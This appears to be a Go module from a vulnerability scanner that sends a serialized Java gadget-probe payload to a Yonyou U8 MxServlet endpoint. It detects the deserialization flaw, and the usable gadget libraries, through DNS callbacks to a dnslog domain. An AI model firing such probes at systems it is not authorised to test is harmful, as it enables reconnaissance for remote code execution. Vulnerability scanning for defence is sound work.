package u8_MxServlet

import (
	"encoding/hex"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
	"yongyouScan/pkg/dnslog"
	"yongyouScan/pkg/utils"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	domain, session := dnslog.GetDnslogUrl()
	url = url + "/servlet/~ic/nc.bs.framework.mx.MxServlet"
	_, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent":     UA,
		"Content-Length": "20434",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(fmt.Sprintf("{{unquote(\"%s\")}}", utils.InsertBackslashX(fmt.Sprintf("ACED0005737200146A6176612E7574696C2E4C696E6B65644C6973740C29535D4A6088220300007870770400000016737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017372000C6A6176612E6E65742E55524C962537361AFCE47203000749000868617368436F6465490004706F72744C0009617574686F726974797400124C6A6176612F6C616E672F537472696E673B4C000466696C6571007E00054C0004686F737471007E00054C000870726F746F636F6C71007E00054C000372656671007E00057870FFFFFFFFFFFFFFFF740014636333316F723332312E%s74000071007E00077400046874747070787672003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001063633332322E%s71007E000871007E000E740004687474707078767200336F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E457874656E64656450726F70657274696573243100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74000F636334302E%s71007E000871007E00147400046874747070787672003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E436861696E65645472616E73666F726D657200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74000F636334312E%s71007E000871007E001A7400046874747070787672002E6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E466C75656E744974657261626C6500000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74000F636231372E%s71007E000871007E0020740004687474707078767200376F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4D617070656450726F706572747944657363726970746F72243100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001063623138782E%s71007E000871007E00267400046874747070787672003A6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E44796E614265616E4D61704465636F7261746F72244D6170456E74727900000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001063623139782E%s71007E000871007E002C740004687474707078767200326F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E496E74726F7370656374696F6E4461746100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF740012633370303932782E%s71007E000871007E003274000468747470707876720031636F6D2E6D6368616E67652E76322E633370302E696D706C2E506F6F6C4261636B656444617461536F757263654261736500000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF740012633370303935782E%s71007E000871007E00387400046874747070787672002D636F6D2E6D6368616E67652E76322E633370302E746573742E416C776179734661696C44617461536F7572636500000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74000E616A772E%s71007E000871007E003E7400046874747070787672002A6F72672E6173706563746A2E7765617665722E746F6F6C732E63616368652E53696D706C65436163686500000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF740012627368323062342E%s71007E000871007E0044740004687474707078767200176273682E436F6C6C656374696F6E4D616E61676572243100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF740012627368323062352E%s71007E000871007E004A7400046874747070787672001A6273682E656E67696E652E427368536372697074456E67696E6500000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF740012627368323062362E%s71007E000871007E0050740004687474707078767200236273682E636F6C6C656374696F6E2E436F6C6C656374696F6E4974657261746F72243100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001867726F6F7679313730323331312E%s71007E000871007E0056740004687474707078767200356F72672E636F6465686175732E67726F6F76792E7265666C656374696F6E2E436C617373496E666F24436C617373496E666F53657400000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001467726F6F76793234782E%s71007E000871007E005C7400046874747070787672001267726F6F76792E6C616E672E5475706C653200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001467726F6F76793234342E%s71007E000871007E0062740004687474707078767200246F72672E636F6465686175732E67726F6F76792E72756E74696D652E64676D243131373000000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74000F6265636C2E%s71007E000871007E006874000468747470707876720031636F6D2E73756E2E6F72672E6170616368652E6263656C2E696E7465726E616C2E7574696C2E436C6173734C6F6164657200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF7400124A646B377532312E%s71007E000871007E006E7400046874747070787672002C636F6D2E73756E2E636F7262612E73652E696D706C2E6F72627574696C2E4F5242436C6173734C6F6164657200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF7400124A5245387532302E%s71007E000871007E0074740004687474707078767200426A617661782E7377696E672E706C61662E6D6574616C2E4D6574616C46696C6543686F6F7365725549244469726563746F7279436F6D626F426F784D6F64656C243100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF7400106C696E75782E%s71007E000871007E007A7400046874747070787672002173756E2E6177742E5831312E4177744772617068696373436F6E6669674461746100000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF74001277696E646F77732E%s71007E000871007E00807400046874747070787672001B73756E2E6177742E77696E646F77732E57427574746F6E5065657200000000000000000000007870787371007E00023F4000000000000C770800000010000000017371007E0004FFFFFFFFFFFFFFFF7400166A61636B736F6E323130302E%s71007E000871007E00867400046874747070787672002C636F6D2E666173746572786D6C2E6A61636B736F6E2E6461746162696E642E6E6F64652E504F4A4F4E6F6465000000000000000000000078707878", hex.EncodeToString([]byte(domain)))))).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 U8 MxServlet反序列化漏洞不存在")
		return
	}
	if dnslog.GetDnslogRecord(session) {
		color.Green.Println("[+] 用友 U8 MxServlet反序列化漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 MxServlet反序列化漏洞不存在")
}
